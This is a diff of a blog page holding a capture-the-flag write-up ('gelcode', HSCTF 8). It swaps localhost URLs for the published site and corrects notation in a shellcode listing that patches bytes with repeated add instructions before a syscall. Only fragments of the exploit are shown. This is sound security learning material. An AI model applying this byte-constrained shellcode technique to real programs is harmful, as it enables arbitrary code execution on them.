@@ -12,15 +12,15 @@
 <meta property="og:locale" content="en_US" />
 <meta name="description" content="gelcode" />
 <meta property="og:description" content="gelcode" />
-<link rel="canonical" href="http://localhost:4000/pwn/2021/06/26/gelcode.html" />
-<meta property="og:url" content="http://localhost:4000/pwn/2021/06/26/gelcode.html" />
+<link rel="canonical" href="https://k1r4.github.io/pwn/2021/06/26/gelcode.html" />
+<meta property="og:url" content="https://k1r4.github.io/pwn/2021/06/26/gelcode.html" />
 <meta property="og:site_name" content="k1R4’s blog" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2021-06-26T14:30:00+05:30" />
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="gelcode [hsctf8]" />
 <script type="application/ld+json">
-{"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/pwn/2021/06/26/gelcode.html"},"@type":"BlogPosting","url":"http://localhost:4000/pwn/2021/06/26/gelcode.html","headline":"gelcode [hsctf8]","dateModified":"2021-06-26T14:30:00+05:30","datePublished":"2021-06-26T14:30:00+05:30","description":"gelcode","@context":"https://schema.org"}</script>
+{"@type":"BlogPosting","headline":"gelcode [hsctf8]","dateModified":"2021-06-26T14:30:00+05:30","datePublished":"2021-06-26T14:30:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"https://k1r4.github.io/pwn/2021/06/26/gelcode.html"},"description":"gelcode","url":"https://k1r4.github.io/pwn/2021/06/26/gelcode.html","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 <link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
 <body>
@@ -90,25 +90,25 @@ Next we have to set cl to a value that makes it easier for us, since every byte 
     add    BYTE PTR [rdx+rax*1], cl (x 3)
 
     add    al,0x1
-    add    BYTE PTR [rdx+rax*1], (cl x 2)
+    add    BYTE PTR [rdx+rax*1], cl (x 2)
 
     add    al,0x1
-    add    BYTE PTR [rdx+rax*1], (cl x 10)
+    add    BYTE PTR [rdx+rax*1], cl (x 10)
     
     add    al,0x1
-    add    BYTE PTR [rdx+rax*1], (cl x 3)
+    add    BYTE PTR [rdx+rax*1], cl (x 3)
 
     add    al,0x1
-    add    BYTE PTR [rdx+rax*1], (cl x 8)
+    add    BYTE PTR [rdx+rax*1], cl (x 8)
     
     add    al,0x1
-    add    BYTE PTR [rdx+rax*1], (cl x 8)
+    add    BYTE PTR [rdx+rax*1], cl (x 8)
     
     add    al,0x5
-    add    BYTE PTR [rdx+rax*1], (cl x 2)
+    add    BYTE PTR [rdx+rax*1], cl (x 2)
 
     add    al,0x1
-    add    BYTE PTR [rdx+rax*1], (cl x 8)
+    add    BYTE PTR [rdx+rax*1], cl (x 8)
     """</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x01\x0f</span><span class="s">"</span><span class="o">+</span><span class="s">"</span><span class="se">\x00\x07\x02\x00\x05\x00\x00</span><span class="s">"</span><span class="o">+</span><span class="s">"</span><span class="se">\x01\x00</span><span class="s">"</span> <span class="o">+</span><span class="n">asm</span><span class="p">(</span><span class="s">"syscall"</span><span class="p">)</span></code></pre></figure>
 <p><br /></p>
 
